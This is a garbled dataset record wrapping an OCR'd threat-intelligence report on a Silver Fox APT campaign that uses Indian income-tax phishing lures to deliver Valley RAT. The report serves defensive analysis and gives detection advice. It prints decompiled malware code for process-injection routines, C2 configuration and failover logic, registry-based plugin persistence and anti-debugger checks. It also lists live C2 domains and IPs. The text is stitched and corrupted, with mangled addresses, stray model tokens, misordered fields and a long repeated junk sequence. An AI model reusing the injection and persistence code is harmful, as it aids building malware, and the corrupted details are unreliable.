\n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "v9=wcscmp(pe.szExeFile,L\"ida.exe\");if(!v9)LogStatus((char*)&Format_4,pe.th32ProcessID);v10=wcscmp(pe.szExeFile,L\"x64dbg.exe\");if(!v10)LogStatus((char*)&Format_5,pe.th32ProcessID);}while(Process32Nextw(Toolhelp32Snapshot,&pe));", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "DisableWindowsUpdateService();\nLogStatus((char *)&Format_6);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/